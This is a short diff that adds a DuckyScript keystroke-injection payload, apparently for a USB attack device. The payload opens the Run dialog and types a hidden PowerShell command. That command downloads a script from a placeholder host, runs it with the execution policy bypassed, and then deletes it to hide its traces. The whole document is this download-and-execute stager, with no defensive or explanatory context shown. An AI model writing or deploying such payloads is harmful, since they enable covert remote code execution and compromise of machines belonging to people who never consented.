@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "iwr http://yourdomain/a.ps1 -o $env:temp\a.ps1; start-sleep 2; powershell -ep bypass -f $env:temp\a.ps1; Remove-Item $env:temp\a.ps1 -Force"
+ENTER
